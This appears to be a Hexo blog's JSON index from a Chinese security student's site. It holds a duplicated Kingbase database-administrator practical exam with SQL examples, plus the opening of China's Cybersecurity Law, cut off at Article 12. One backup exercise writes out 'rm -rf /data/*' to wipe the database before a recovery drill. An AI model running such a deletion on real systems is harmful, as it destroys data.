{"meta":{"title":"小菜逼","subtitle":"web安全小菜逼","description":"本科 | 计算机科学与技术 | 网络安全","author":"林先生","url":"http://www.xiaocaibi.top","root":"/"},"pages":[{"title":"404","date":"2019-08-10T08:41:10.000Z","updated":"2021-12-08T08:14:05.950Z","comments":true,"path":"404.html","permalink":"http://www.xiaocaibi.top/404.html","excerpt":"","text":""},{"title":"","date":"2021-12-08T08:41:37.901Z","updated":"2021-12-08T08:14:06.094Z","comments":true,"path":"baidu_verify_xxxxxxx.html","permalink":"http://www.xiaocaibi.top/baidu_verify_xxxxxxx.html","excerpt":"","text":"wvlc3L96QK"},{"title":"","date":"2021-12-08T08:41:37.902Z","updated":"2021-12-08T08:14:06.201Z","comments":true,"path":"google1xxxxxxx0.html","permalink":"http://www.xiaocaibi.top/google1xxxxxxx0.html","excerpt":"","text":"google-site-verification: google110e5e5e14c8dcf0.html"},{"title":"放松一下","date":"2019-08-10T08:41:10.000Z","updated":"2021-12-08T08:14:05.967Z","comments":true,"path":"List/index.html","permalink":"http://www.xiaocaibi.top/List/index.html","excerpt":"","text":"影音资源共享"},{"title":"about","date":"2019-10-24T16:00:00.000Z","updated":"2021-12-08T08:14:06.093Z","comments":true,"path":"about/index.html","permalink":"http://www.xiaocaibi.top/about/index.html","excerpt":"","text":""},{"title":"archives","date":"2019-10-24T16:00:00.000Z","updated":"2021-12-08T08:14:06.093Z","comments":true,"path":"archives/index.html","permalink":"http://www.xiaocaibi.top/archives/index.html","excerpt":"","text":""},{"title":"categories","date":"2019-10-24T16:00:00.000Z","updated":"2021-12-08T08:14:06.095Z","comments":true,"path":"categories/index.html","permalink":"http://www.xiaocaibi.top/categories/index.html","excerpt":"","text":""},{"title":"统计","date":"2020-10-31T02:11:28.000Z","updated":"2021-12-08T08:14:06.096Z","comments":true,"path":"census/index.html","permalink":"http://www.xiaocaibi.top/census/index.html","excerpt":"","text":""},{"title":"留言板","date":"2019-10-24T16:00:00.000Z","updated":"2021-12-15T11:49:27.652Z","comments":true,"path":"contact/index.html","permalink":"http://www.xiaocaibi.top/contact/index.html","excerpt":"","text":"畅所欲言 关注信息安全,关注未来发展,在这里可以留下你的足迹，欢迎在下方留言，欢迎交换友链，一起交流学习！ 友链 小菜逼友链信息 博客名称: weba安全小菜逼博客 博客网址: http://xiaocaibi.top 博客头像: https://s1.ax1x.com/2020/05/17/YRWsYT.png 博客介绍: The harder you work, the luckier you will be"},{"title":"全球网络威胁实时地图","date":"2021-12-15T12:58:50.000Z","updated":"2021-12-19T05:38:53.455Z","comments":true,"path":"dt/index.html","permalink":"http://www.xiaocaibi.top/dt/index.html","excerpt":"","text":""},{"title":"友链","date":"2019-07-19T08:42:10.000Z","updated":"2021-12-08T08:14:06.196Z","comments":true,"path":"friends/index.html","permalink":"http://www.xiaocaibi.top/friends/index.html","excerpt":"","text":""},{"title":"tags","date":"2019-07-19T08:40:27.000Z","updated":"2021-12-08T08:14:06.240Z","comments":true,"path":"tags/index.html","permalink":"http://www.xiaocaibi.top/tags/index.html","excerpt":"","text":""},{"title":"资源分享","date":"2019-07-19T08:40:27.000Z","updated":"2021-12-08T08:14:06.203Z","comments":true,"path":"resource/index.html","permalink":"http://www.xiaocaibi.top/resource/index.html","excerpt":"","text":""},{"title":"wp","date":"2021-12-17T12:35:16.000Z","updated":"2021-12-19T05:56:19.872Z","comments":true,"path":"wp/index.html","permalink":"http://www.xiaocaibi.top/wp/index.html","excerpt":"","text":""},{"title":"相册","date":"2021-12-08T08:41:37.905Z","updated":"2021-12-08T08:14:05.957Z","comments":true,"path":"List/galleries/index.html","permalink":"http://www.xiaocaibi.top/List/galleries/index.html","excerpt":"","text":""},{"title":"听听音乐","date":"2019-07-19T08:40:27.000Z","updated":"2021-12-08T08:14:05.967Z","comments":true,"path":"List/music/index.html","permalink":"http://www.xiaocaibi.top/List/music/index.html","excerpt":"","text":""},{"title":"视频","date":"2019-08-10T08:41:10.000Z","updated":"2021-12-08T08:14:05.967Z","comments":true,"path":"List/movies/index.html","permalink":"http://www.xiaocaibi.top/List/movies/index.html","excerpt":"","text":""},{"title":"听听音乐","date":"2019-07-19T08:40:27.000Z","updated":"2021-12-08T08:14:05.968Z","comments":true,"path":"List/tools/index.html","permalink":"http://www.xiaocaibi.top/List/tools/index.html","excerpt":"","text":""},{"title":"动漫人物","date":"2021-12-08T08:41:37.907Z","updated":"2021-12-08T08:14:05.959Z","comments":true,"path":"List/galleries/动漫人物/index.html","permalink":"http://www.xiaocaibi.top/List/galleries/%E5%8A%A8%E6%BC%AB%E4%BA%BA%E7%89%A9/index.html","excerpt":"","text":""},{"title":"乖巧小狗","date":"2021-12-08T08:41:37.906Z","updated":"2021-12-08T08:14:05.957Z","comments":true,"path":"List/galleries/乖巧小狗/index.html","permalink":"http://www.xiaocaibi.top/List/galleries/%E4%B9%96%E5%B7%A7%E5%B0%8F%E7%8B%97/index.html","excerpt":"","text":""},{"title":"动漫插画","date":"2021-12-08T08:41:37.907Z","updated":"2021-12-08T08:14:05.960Z","comments":true,"path":"List/galleries/动漫插画/index.html","permalink":"http://www.xiaocaibi.top/List/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/index.html","excerpt":"","text":""},{"title":"二次元风","date":"2021-12-08T08:41:37.906Z","updated":"2021-12-08T08:14:05.958Z","comments":true,"path":"List/galleries/二次元风/index.html","permalink":"http://www.xiaocaibi.top/List/galleries/%E4%BA%8C%E6%AC%A1%E5%85%83%E9%A3%8E/index.html","excerpt":"","text":""},{"title":"动漫风景","date":"2021-12-08T08:41:37.907Z","updated":"2021-12-08T08:14:05.960Z","comments":true,"path":"List/galleries/动漫风景/index.html","permalink":"http://www.xiaocaibi.top/List/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/index.html","excerpt":"","text":""},{"title":"呆萌猫咪","date":"2021-12-08T08:41:37.908Z","updated":"2021-12-08T08:14:05.962Z","comments":true,"path":"List/galleries/呆萌猫咪/index.html","permalink":"http://www.xiaocaibi.top/List/galleries/%E5%91%86%E8%90%8C%E7%8C%AB%E5%92%AA/index.html","excerpt":"","text":""},{"title":"清新花卉","date":"2021-12-08T08:41:37.909Z","updated":"2021-12-08T08:14:05.963Z","comments":true,"path":"List/galleries/清新花卉/index.html","permalink":"http://www.xiaocaibi.top/List/galleries/%E6%B8%85%E6%96%B0%E8%8A%B1%E5%8D%89/index.html","excerpt":"","text":""},{"title":"城市风光","date":"2021-12-08T08:41:37.908Z","updated":"2021-12-08T08:14:05.963Z","comments":true,"path":"List/galleries/城市风光/index.html","permalink":"http://www.xiaocaibi.top/List/galleries/%E5%9F%8E%E5%B8%82%E9%A3%8E%E5%85%89/index.html","excerpt":"","text":""},{"title":"炫酷跑车","date":"2021-12-08T08:41:37.909Z","updated":"2021-12-08T08:14:05.964Z","comments":true,"path":"List/galleries/炫酷跑车/index.html","permalink":"http://www.xiaocaibi.top/List/galleries/%E7%82%AB%E9%85%B7%E8%B7%91%E8%BD%A6/index.html","excerpt":"","text":""},{"title":"甜美食品","date":"2021-12-08T08:41:37.910Z","updated":"2021-12-08T08:14:05.965Z","comments":true,"path":"List/galleries/甜美食品/index.html","permalink":"http://www.xiaocaibi.top/List/galleries/%E7%94%9C%E7%BE%8E%E9%A3%9F%E5%93%81/index.html","excerpt":"","text":""},{"title":"璀璨星空","date":"2021-12-08T08:41:37.910Z","updated":"2021-12-08T08:14:05.965Z","comments":true,"path":"List/galleries/璀璨星空/index.html","permalink":"http://www.xiaocaibi.top/List/galleries/%E7%92%80%E7%92%A8%E6%98%9F%E7%A9%BA/index.html","excerpt":"","text":""},{"title":"自然风景","date":"2021-12-08T08:41:37.910Z","updated":"2021-12-08T08:14:05.966Z","comments":true,"path":"List/galleries/自然风景/index.html","permalink":"http://www.xiaocaibi.top/List/galleries/%E8%87%AA%E7%84%B6%E9%A3%8E%E6%99%AF/index.html","excerpt":"","text":""}],"posts":[{"title":"数据库","slug":"数据库","date":"2021-11-18T11:28:26.000Z","updated":"2021-12-17T12:11:18.374Z","comments":true,"path":"posts/14ea6df7.html","link":"","permalink":"http://www.xiaocaibi.top/posts/14ea6df7.html","excerpt":"","text":"数据库管理员实操测试题数据库管理员实操测试题考前准备：由老师下发VM16及纯净linux集群环境，做好测试准备。 一、在系统中安装并优化linux系统参数 （1） 查看优化前设置 ​ （2） 查看脚本优化功能 （3） 优化后检查执行结果 二、部署安装Kingbase数据库 （1） 按实施规范创建目录，设置目录的属主、属组、权限并验证 （2） 上传相关安装包，授权文件等，设置授权文件的属主和权限并验证 （3） 安装kingbase数据库，将 KES 服务注册为 linux 系统服务 （4） 查看并验证数据库是否安装成功，并能正常连接 （5） 配置用户的环境变量，优化数据库脚本 三、数据库参数配置 （1） 使用自动化工具优化内存、检查点、并行度 （2） 用命令配置数据库参数shared_buffers为600M、连接数设置成200个普通帐号，白名单为192.168.40.0/24，192.168.20.0/24 四、数据库管理 （1） 新建数据库 db01 create database db01; （2） 查看 db01 数据库的信息 （3） 创建开发者用户 user01 并授予用户 user01连接数据库 db01的权限 test=# create user user01 password 'user01'; test=# grant CONNECT ON DATABASE db01 TO user01; （4） 授予用户 user01拥有 db01库中 public模式 all权限 grant ALL ON SCHEMA PUBLIC TO user01 ; （5） user01 用户登录 db01库后在 public模式中创建表 t01 create table PUBLIC.t01(id int ); （6） 查看上述操作的 SQL代码 （7） 创建普通用户 user02 并授予用户 user02 连接数据库 db01的权限 db01=# create user user02 password 'user02'; db01=# grant CONNECT ON DATABASE db01 TO user02; （8） 授予对 user01用户的 t01 表拥有 select和 insert、update、delete权限 db01=# grant SELECT ON PUBLIC.t01 TO user01; db01=# grant INSERT ON PUBLIC.t01 TO user01; db01=# grant UPDATE ON PUBLIC.t01 TO user01; db01=# grant DELETE on PUBLIC.t01 to user01; （9） 验证 user02 对 t01 表的操作权限（表执行查询、插入、修改、删除操作，无权删除 t01 表） db01=&gt; select * from PUBLIC.t01 ; 错误: 对关系 t01 权限不够 db01=&gt; insert into PUBLIC.t01 values (1); 错误: 对关系 t01 权限不够 db01=&gt; drop table PUBLIC.t01 ; 错误: 必须是关系 t01 的属主 五、创建表入录入数据 （1） 在 db01 库 public 模式下创建表 t02，并插入数据（使用SQL语句） （2） 编写 SQL语句查看表 t02的数据 （3） 单表综合查询：查询人员表30及以上部门的平均工资，只显示出部门平均工资大于8000记录 （4） 多表关联查询：查询人员工号、姓名、部门名称，只显示5条记录 （5） 嵌套子查询：查询跟 141 号员工同职位，同时工资比 138 号员工高的员工信息 （6） 关联子查询：查询员工工资大于自己部门平均工资的所有员工信息 （7）将表 t02备份为 sql、csv、binary(二进制)格式，根据提示进行适当的配置 （8）查看导出文件 六、KSQL对象管理 （1） 使用system用户连接IP地址为192.168.40.111，端口54321的对象 （2） 导入“MYSQL初始化脚本5.5.txt”，查看库内数据表 库内有两个表：这两表用于下面的查询。 1.scott.dept ​ 2.sctott.emp （3） 查看表 scott.dept（sql命令） （4） 导出表数据库到 csv 文件 七、切换用户登录 （1） 查看连接 （2） 创建用户kca，并登录kca（密码自定义） （3） 切换用户kca为system用户意见 （4） 创建数据库db1并连接 （5） 切换到数据库samples 八、用户与角色授权 （1） 创建用户u1 （2） 创建角色r1 （3） 对用户u1和角色r1，授权为可读写，可执行 九、表的模式和对象管理 （1） 创建测试表table8(id int) （2） 创建用户user8 ，密码：KES8 （3） 授予user8访问库的权限为c/stystem （4） 授予user8访问模式的权限为U/stystem ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119104007370.png) （5） 授予user8访问表的权限r/SYSTEM （6） 修改用户口令有效期，查看用户口令有效期 （7） 删除user8表级权限依赖，模式级权限依赖，库级权限依赖 （8） 撤消user8库级、模式级、对象级授权 revoke CONNECT ON DATABASE TEST FROM revoke USAGE ON SCHEMA PUBLIC FROM user8; revoke SELECT ON PUBLIC.table8 FROM user8; （9） 删除user8用户是否成功 十、数据库模板 （1）用管理员 system 连接数据库 TEST （3） 创建用户 user01 create user user01 password 'kingbase'; （4） 创建数据库 db01，属主为 user01、编码为 UTF8、参照模板 template0、连接数为 10 create database db01 owner user01 ENCODING 'utf8' TEMPLATE template0 CONNECTION LIMIT 10; （5） 检查数据库的定义信息 （6） 修改数据库 db01 属主修改为 system alter database db01 owner to SYSTEM ; （7） 修改数据库 db01 名称为 db10 alter database db01 rename to db10; （8） 删除数据库 db10，提示无法删除当前使用的数据库 drop database db10 ; （9） 切换到数据库 TEST （10） 删除数据库 db10，提示删除完成 drop database db10 ; 十一、表空间的增删改查 （1） 用管理员 system 连接数据库 test （2） 使用元命令查看表空间信息，使用数据字典查看表空间信息，查看数据库的默认表空间信息 \\db+ select oid,spcname from sys_tablespace; \\l+ （3） 规划表空间对应的文件系统目录，切换到操作系统管理员 root，在根目录下新建目录 dir01，设定目录 dir01 的属主、属组、权限，检查目录 dir01 的定义信息 （4） 新建表空间 tbs01，由管理员 system 连接数据库 test，新建表空间 tbs01，关联目录/dir01，表空间属主默认，查看表空间 tbs01 的信息 （5） 修改表空间 tbs01 的属主和名称，管理员 system 登录数据库 test 并创建用户 user01，修改表空间 tbs10 的属主为 user01，修改表空间 tbs01 的名称为 tbs10 （6） 修改数据库 samples 的默认表空间为 tbs01，由管理员 system 连接数据库 test，修改数据库 samples 默认表空间为 tbs10 alter database SAMPLES set tablespace tbs10; （7） 移动表到新的表空间，由管理员 system 连接数据库 test，查看现有表空间，在表空间 sys_defualt 中创建表 t01 并插入 1 行数据，移动表 t01 到表空间 tbs10 中 \\db+ test=# create table t01(id int) tablespace SYS_DEFAULT ; （8） 检查表空间修改结果，查看 samples 数据库当前的默认表空间，查看 test 数据库中 t01 表当前所在的表空间，查看新表空间的名称、属主等信息 十二、系统物理备份 （1）开启归档模式，进行快速部署，配置 （2）在数据表里创建新表a1(int id)，使用generate_series函数插入10000条数据，数据内容为1-10000 （3）用命令手动完成一次增量备份 （4）在数据表里创建新表b1(int id)，使用generate_series函数插入10000条数据，数据内容为1-10000 （5）用命令手动完成一次全备份 （6）用命令rm-rf /data/*删除数据库，然后做数据库完全恢复。 十三、数据库简单运维 （1） 查看 KES 版本信息 （2） 查看 license 有效期 select get_license_validdays(); （3） 查看数据库实例启动时间 select sys_postmaster_start_time(); （4） 查看 KES 无故障运行时长 test=# select date_trunc('second',current_timestamp - test(# sys_postmaster_start_time()) as uptime; （5） 查看数据库列表 \\l （6） 统计当前数据库占用的磁盘空间 select sys_database_size(current_database())/1024/1024||'mb''mb'; （7） 统计所有数据库占用的磁盘空间总量 ``` （8） 统计表的空间占用 （9） 统计表和与表关联的索引占用空间总量 （10） 查看耗时较长的 SQL （11） 采集连接数 十四、系统情况检查 （1） 检查系统CPU情况 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118180216780.png) （2） 检查内存情况 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118180104291.png) （3） 磁盘资源消耗情况 （4） SQL执行时间等 ### 数据库管理员实操测试题 考前准备：由老师下发VM16及纯净linux集群环境，做好测试准备。 一、在系统中安装并优化linux系统参数 （1） 查看优化前设置 ​ ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118181824816.png) （2） 查看脚本优化功能![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118182120225.png) （3） 优化后检查执行结果 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118182409771.png) ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118182520357.png) ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118182705040.png) 二、部署安装Kingbase数据库 （1） 按实施规范创建目录，设置目录的属主、属组、权限并验证 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118184111379.png) ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118184546492.png) （2） 上传相关安装包，授权文件等，设置授权文件的属主和权限并验证 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118191319485.png) ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118191844451.png) （3） 安装kingbase数据库，将 KES 服务注册为 linux 系统服务 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118192405033.png) ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119091937077.png) ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119101119546.png) （4） 查看并验证数据库是否安装成功，并能正常连接 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119101238823.png) ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119101502107.png) （5） 配置用户的环境变量，优化数据库脚本 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119102334962.png) 三、数据库参数配置 （1） 使用自动化工具优化内存、检查点、并行度 （2） 用命令配置数据库参数shared_buffers为600M、连接数设置成200个普通帐号，白名单为192.168.40.0/24，192.168.20.0/24 四、数据库管理 （1） 新建数据库 db01 create database db01; ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118144157605.png) （2） 查看 db01 数据库的信息 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118144246084.png) （3） 创建开发者用户 user01 并授予用户 user01连接数据库 db01的权限 test=# create user user01 password ‘user01’; test=# grant CONNECT ON DATABASE db01 TO user01; ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118144356952.png) （4） 授予用户 user01拥有 db01库中 public模式 all权限 grant ALL ON SCHEMA PUBLIC TO user01 ; ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118144611480.png) （5） user01 用户登录 db01库后在 public模式中创建表 t01 create table PUBLIC.t01(id int ); ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118144807077.png) （6） 查看上述操作的 SQL代码 （7） 创建普通用户 user02 并授予用户 user02 连接数据库 db01的权限 db01=# create user user02 password ‘user02’; db01=# grant CONNECT ON DATABASE db01 TO user02; ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118145037688.png) （8） 授予对 user01用户的 t01 表拥有 select和 insert、update、delete权限 db01=# grant SELECT ON PUBLIC.t01 TO user01; db01=# grant INSERT ON PUBLIC.t01 TO user01; db01=# grant UPDATE ON PUBLIC.t01 TO user01; db01=# grant DELETE on PUBLIC.t01 to user01; ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118145411938.png) （9） 验证 user02 对 t01 表的操作权限（表执行查询、插入、修改、删除操作，无权删除 t01 表） db01=&gt; select * from PUBLIC.t01 ;错误: 对关系 t01 权限不够db01=&gt; insert into PUBLIC.t01 values (1);错误: 对关系 t01 权限不够db01=&gt; drop table PUBLIC.t01 ;错误: 必须是关系 t01 的属主 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118145858876.png) 五、创建表入录入数据 （1） 在 db01 库 public 模式下创建表 t02，并插入数据（使用SQL语句） （2） 编写 SQL语句查看表 t02的数据 （3） 单表综合查询：查询人员表30及以上部门的平均工资，只显示出部门平均工资大于8000记录 （4） 多表关联查询：查询人员工号、姓名、部门名称，只显示5条记录 （5） 嵌套子查询：查询跟 141 号员工同职位，同时工资比 138 号员工高的员工信息 （6） 关联子查询：查询员工工资大于自己部门平均工资的所有员工信息 （7）将表 t02备份为 sql、csv、binary(二进制)格式，根据提示进行适当的配置 （8）查看导出文件 六、KSQL对象管理 （1） 使用system用户连接IP地址为192.168.40.111，端口54321的对象 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118150320850.png) （2） 导入“MYSQL初始化脚本5.5.txt”，查看库内数据表 库内有两个表：这两表用于下面的查询。 1.scott.dept ​ 2.sctott.emp （3） 查看表 scott.dept（sql命令） （4） 导出表数据库到 csv 文件 七、切换用户登录 （1） 查看连接![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118160016825.png) （2） 创建用户kca，并登录kca（密码自定义） ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118160107898.png) （3） 切换用户kca为system用户意见 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118160219201.png) （4） 创建数据库db1并连接 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118160254717.png) （5） 切换到数据库samples ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118160326517.png) 八、用户与角色授权 （1） 创建用户u1 （2） 创建角色r1 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118160442649.png) （3） 对用户u1和角色r1，授权为可读写，可执行 九、表的模式和对象管理 （1） 创建测试表table8(id int) （2） 创建用户user8 ，密码：KES8 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119103542701.png) （3） 授予user8访问库的权限为c/stystem ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119103649190.png) （4） 授予user8访问模式的权限为U/stystem ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119104007370.png) （5） 授予user8访问表的权限r/SYSTEM ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119104156834.png) （6） 修改用户口令有效期，查看用户口令有效期 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119105521190.png) ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119105458515.png) （7） 删除user8表级权限依赖，模式级权限依赖，库级权限依赖 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119105907811.png) （8） 撤消user8库级、模式级、对象级授权 revoke CONNECT ON DATABASE TEST FROMrevoke USAGE ON SCHEMA PUBLIC FROM user8;revoke SELECT ON PUBLIC.table8 FROM user8; ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119110136806.png) （9） 删除user8用户是否成功 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119110249325.png) 十、数据库模板 （1）用管理员 system 连接数据库 TEST ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118105631515.png) （3） 创建用户 user01 create user user01 password ‘kingbase’; ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118104704043.png) （4） 创建数据库 db01，属主为 user01、编码为 UTF8、参照模板 template0、连接数为 10 create database db01 owner user01 ENCODING ‘utf8’ TEMPLATE template0 CONNECTION LIMIT 10; ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118104901865.png) （5） 检查数据库的定义信息 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118105022065.png) （6） 修改数据库 db01 属主修改为 system alter database db01 owner to SYSTEM ; ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118105106730.png) （7） 修改数据库 db01 名称为 db10 alter database db01 rename to db10; ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118105155648.png) （8） 删除数据库 db10，提示无法删除当前使用的数据库 drop database db10 ; ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118105341261.png) （9） 切换到数据库 TEST ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118105435329.png) （10） 删除数据库 db10，提示删除完成 drop database db10 ; ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118105510110.png) 十一、表空间的增删改查 （1） 用管理员 system 连接数据库 test ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118150654326.png) （2） 使用元命令查看表空间信息，使用数据字典查看表空间信息，查看数据库的默认表空间信息 \\db+ select oid,spcname from sys_tablespace; \\l+ ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119094244437.png) ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119094355382.png) （3） 规划表空间对应的文件系统目录，切换到操作系统管理员 root，在根目录下新建目录 dir01，设定目录 dir01 的属主、属组、权限，检查目录 dir01 的定义信息![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118151558151.png) （4） 新建表空间 tbs01，由管理员 system 连接数据库 test，新建表空间 tbs01，关联目录/dir01，表空间属主默认，查看表空间 tbs01 的信息![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118151850349.png) （5） 修改表空间 tbs01 的属主和名称，管理员 system 登录数据库 test 并创建用户 user01，修改表空间 tbs10 的属主为 user01，修改表空间 tbs01 的名称为 tbs10 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118152106841.png) ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118152157749.png) （6） 修改数据库 samples 的默认表空间为 tbs01，由管理员 system 连接数据库 test，修改数据库 samples 默认表空间为 tbs10 alter database SAMPLES set tablespace tbs10; ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118152504956.png) （7） 移动表到新的表空间，由管理员 system 连接数据库 test，查看现有表空间，在表空间 sys_defualt 中创建表 t01 并插入 1 行数据，移动表 t01 到表空间 tbs10 中 \\db+ test=# create table t01(id int) tablespace SYS_DEFAULT ; ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119093021134.png) ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119093219668.png) ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119093327756.png) ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119093429511.png) （8） 检查表空间修改结果，查看 samples 数据库当前的默认表空间，查看 test 数据库中 t01 表当前所在的表空间，查看新表空间的名称、属主等信息 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119093800486.png) 十二、系统物理备份 （1）开启归档模式，进行快速部署，配置 （2）在数据表里创建新表a1(int id)，使用generate_series函数插入10000条数据，数据内容为1-10000 （3）用命令手动完成一次增量备份 （4）在数据表里创建新表b1(int id)，使用generate_series函数插入10000条数据，数据内容为1-10000 （5）用命令手动完成一次全备份 （6）用命令rm-rf /data/*删除数据库，然后做数据库完全恢复。 十三、数据库简单运维 （1） 查看 KES 版本信息![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118165956929.png) （2） 查看 license 有效期 select get_license_validdays(); ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118174602254.png) （3） 查看数据库实例启动时间 select sys_postmaster_start_time(); ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118174823902.png) （4） 查看 KES 无故障运行时长 test=# select date_trunc(‘second’,current_timestamp - test(# sys_postmaster_start_time()) as uptime; ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118175144920.png) （5） 查看数据库列表 \\l ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118175501188.png) （6） 统计当前数据库占用的磁盘空间 select sys_database_size(current_database())/1024/1024||’mb’’mb’; ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118175655666.png) （7） 统计所有数据库占用的磁盘空间总量 （8） 统计表的空间占用 （9） 统计表和与表关联的索引占用空间总量 （10） 查看耗时较长的 SQL （11） 采集连接数 ``` 十四、系统情况检查 （1） 检查系统CPU情况 （2） 检查内存情况 （3） 磁盘资源消耗情况 （4） SQL执行时间等","categories":[],"tags":[{"name":"数据库","slug":"数据库","permalink":"http://www.xiaocaibi.top/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"中国网络安全法","slug":"中国网络安全法","date":"2021-10-27T06:50:13.000Z","updated":"2021-10-27T07:56:38.469Z","comments":true,"path":"posts/491de8e6.html","link":"","permalink":"http://www.xiaocaibi.top/posts/491de8e6.html","excerpt":"","text":"中华人民共和国网络安全法中华人民共和国网络安全法 《中华人民共和国网络安全法》是为保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展而制定的法律。 《中华人民共和国网络安全法》由中华人民共和国第十二届全国人民代表大会常务委员会第二十四次会议于 2016 年 11 月 7 日通过，自 2017 年 6 月 1 日起施行。 第一章 总 则 第一条 为了保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展，制定本法。 第二条 在中华人民共和国境内建设、运营、维护和使用网络，以及网络安全的监督管理，适用本法。 第三条 国家坚持网络安全与信息化发展并重，遵循积极利用、科学发展、依法管理、确保安全的方针，推进网络基础设施建设和互联互通，鼓励网络技术创新和应用，支持培养网络安全人才，建立健全网络安全保障体系，提高网络安全保护能力。 第四条 国家制定并不断完善网络安全战略，明确保障网络安全的基本要求和主要目标，提出重点领域的网络安全政策、工作任务和措施。 第五条 国家采取措施，监测、防御、处置来源于中华人民共和国境内外的网络安全风险和威胁，保护关键信息基础设施免受攻击、侵入、干扰和破坏，依法惩治网络违法犯罪活动，维护网络空间安全和秩序。 第六条 国家倡导诚实守信、健康文明的网络行为，推动传播社会主义核心价值观，采取措施提高全社会的网络安全意识和水平，形成全社会共同参与促进网络安全的良好环境。 第七条 国家积极开展网络空间治理、网络技术研发和标准制定、打击网络违法犯罪等方面的国际交流与合作，推动构建和平、安全、开放、合作的网络空间，建立多边、民主、透明的网络治理体系。 第八条 国家网信部门负责统筹协调网络安全工作和相关监督管理工作。国务院电信主管部门、公安部门和其他有关机关依照本法和有关法律、行政法规的规定，在各自职责范围内负责网络安全保护和监督管理工作。县级以上地方人民政府有关部门的网络安全保护和监督管理职责，按照国家有关规定确定。 第九条 网络运营者开展经营和服务活动，必须遵守法律、行政法规，尊重社会公德，遵守商业道德，诚实信用，履行网络安全保护义务，接受政府和社会的监督，承担社会责任。 第十条 建设、运营网络或者通过网络提供服务，应当依照法律、行政法规的规定和国家标准的强制性要求，采取技术措施和其他必要措施，保障网络安全、稳定运行，有效应对网络安全事件，防范网络违法犯罪活动，维护网络数据的完整性、保密性和可用性。 第十一条 网络相关行业组织按照章程，加强行业自律，制定网络安全行为规范，指导会员加强网络安全保护，提高网络安全保护水平，促进行业健康发展。 第十二条 